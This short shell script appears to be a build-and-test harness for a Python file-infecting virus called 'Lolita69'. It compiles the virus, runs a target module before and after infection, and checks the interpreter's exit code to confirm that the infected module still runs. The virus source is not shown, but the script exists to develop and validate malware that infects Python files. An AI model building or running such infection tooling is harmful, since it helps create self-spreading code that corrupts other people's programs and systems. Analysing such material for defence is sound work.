#!/bin/sh

echo "Building..."
python builder.py
echo "Build complete."

echo "\nExec before infect:"
(cd targets; rm *.pyc; python -c "import hello")
echo "Executed."

echo "\nTesting Lolita69..."
python lolita.final.pyc
echo "Test complete."

echo "\nExec after infect:"
(cd targets; python -c "import hello"; echo "Python interpreter returned: "$?" (0 is a cool value!)")
echo "Executed."
